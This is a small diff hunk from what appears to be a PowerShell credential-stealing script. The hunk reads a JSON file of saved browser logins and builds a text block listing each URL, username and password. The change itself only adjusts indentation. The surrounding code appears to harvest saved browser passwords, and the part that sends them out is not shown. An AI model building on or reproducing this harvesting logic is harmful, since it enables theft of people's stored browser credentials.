@@ -45,7 +45,7 @@ try {
             $data = Get-Content $jsonFile.FullName | ConvertFrom-Json
             $browsers = ""
             foreach($item in $data) {
-                $browsers += "$($item.url)`n  User: $($item.username)`n  Pass: $($item.password)`n`n"
+                $browsers += "$($item.url)`nUser: $($item.username)`nPass: $($item.password)`n`n"
             }
             if(-not $browsers) { $browsers = "No saved browser passwords found" }
         } else {
